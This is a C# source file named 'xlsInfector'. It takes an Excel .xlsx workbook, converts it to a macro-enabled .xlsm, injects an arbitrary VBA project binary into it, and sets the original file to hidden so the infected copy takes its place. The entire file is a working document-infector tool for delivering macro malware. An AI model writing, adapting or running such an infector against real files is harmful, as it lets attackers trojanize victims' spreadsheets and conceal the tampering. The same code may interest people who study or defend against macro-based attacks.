using System;
using System.IO;
using System.IO.Compression;

namespace xlsInfector
{
    class Infector
    {
        static void Main(string[] args)
        {
            // Temporary folders & files
            string workingPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Microsoft\\Office\\";
            string workingPathTmp = workingPath + "InfectionLab\\";
            string infectedFile = args[0].Replace(".xlsx", ".xlsm");

            // Patterns
            string bin = "<Default ContentType=\"application/vnd.ms-office.vbaProject\" Extension=\"bin\" /></Types>";
            string override_bad = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml";
            string override_good = "application/vnd.ms-excel.sheet.macroEnabled.main+xml";
            string rels = "<Relationship Target=\"vbaProject.bin\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Id=\"rId99999\"/></Relationships>";

            // Extract XLSX contents
            ZipFile.ExtractToDirectory(args[0], workingPathTmp);

            // Fix files
            string content_types = File.ReadAllText(workingPathTmp + "[Content_Types].xml");
            content_types = content_types.Replace("</Types>", bin).Replace(override_bad, override_good);
            File.WriteAllText(workingPathTmp + "[Content_Types].xml", content_types);
            string xl_rels = File.ReadAllText(workingPathTmp + "xl\\_rels\\workbook.xml.rels");
            xl_rels = xl_rels.Replace("</Relationships>", rels);
            File.WriteAllText(workingPathTmp + "xl\\_rels\\workbook.xml.rels", xl_rels);

            // Copy the macro
            File.Copy(args[1], workingPathTmp + "xl\\vbaProject.bin");

            // Create the XLSM file
            ZipFile.CreateFromDirectory(workingPathTmp, infectedFile, CompressionLevel.Fastest, false);

            // Hide original
            File.SetAttributes(args[0], File.GetAttributes(args[0]) | FileAttributes.Hidden);

            // Clean up
            DirectoryInfo dir = new DirectoryInfo(workingPathTmp);
            dir.Delete(true);
        }
    }
}
